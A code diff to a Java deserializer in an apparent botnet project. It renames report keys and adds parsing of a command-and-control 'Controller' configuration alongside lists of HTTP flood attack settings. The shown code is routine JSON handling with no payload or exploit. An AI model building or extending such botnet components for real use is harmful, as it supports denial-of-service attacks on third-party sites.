@@ -28,6 +28,7 @@ package com.acmutv.botnet.core.report.serial;
 
 import com.acmutv.botnet.config.AppConfiguration;
 import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
+import com.acmutv.botnet.core.control.Controller;
 import com.acmutv.botnet.core.report.SimpleReport;
 import com.fasterxml.jackson.core.*;
 import com.fasterxml.jackson.databind.DeserializationContext;
@@ -80,26 +81,34 @@ public class SimpleReportDeserializer extends StdDeserializer<SimpleReport> {
     JsonNode node = parser.getCodec().readTree(parser);
     SimpleReport report = new SimpleReport();
 
-    if (node.hasNonNull(SimpleReport.KEY_CONFIGURATION)) {
+    if (node.hasNonNull(SimpleReport.KEY_CONFIG_APP)) {
       final AppConfiguration config =
-          ctx.readValue(node.get(SimpleReport.KEY_CONFIGURATION).traverse(parser.getCodec()), AppConfiguration.class);
-      report.put(SimpleReport.KEY_CONFIGURATION, config);
+          ctx.readValue(node.get(SimpleReport.KEY_CONFIG_APP).traverse(parser.getCodec()), AppConfiguration.class);
+      report.put(SimpleReport.KEY_CONFIG_APP, config);
     }
 
-    if (node.hasNonNull(SimpleReport.KEY_ATTACKS_HTTP)) {
+    if (node.hasNonNull(SimpleReport.KEY_CONFIG_CONTROLLER)) {
+      final Controller controller =
+          ctx.readValue(node.get(SimpleReport.KEY_CONFIG_CONTROLLER)
+              .traverse(parser.getCodec()), Controller.class);
+      report.put(SimpleReport.KEY_CONFIG_CONTROLLER, controller);
+    }
+
+    if (node.hasNonNull(SimpleReport.KEY_ATTACKS)) {
       List<HttpFloodAttack> httpAttacks = new ArrayList<>();
-      Iterator<JsonNode> iter = node.get(SimpleReport.KEY_ATTACKS_HTTP).elements();
+      Iterator<JsonNode> iter = node.get(SimpleReport.KEY_ATTACKS).elements();
       while (iter.hasNext()) {
         JsonNode n = iter.next();
         HttpFloodAttack attack = ctx.readValue(n.traverse(parser.getCodec()), HttpFloodAttack.class);
         httpAttacks.add(attack);
       }
-      report.put(SimpleReport.KEY_ATTACKS_HTTP, httpAttacks);
+      report.put(SimpleReport.KEY_ATTACKS, httpAttacks);
     }
 
     node.fields().forEachRemaining(f -> {
-      if (!f.getKey().equals(SimpleReport.KEY_CONFIGURATION) &&
-          !f.getKey().equals(SimpleReport.KEY_ATTACKS_HTTP)) {
+      if (!f.getKey().equals(SimpleReport.KEY_CONFIG_APP) &&
+          !f.getKey().equals(SimpleReport.KEY_CONFIG_CONTROLLER) &&
+          !f.getKey().equals(SimpleReport.KEY_ATTACKS)) {
         report.put(f.getKey(), f.getValue().asText());
       }
     });
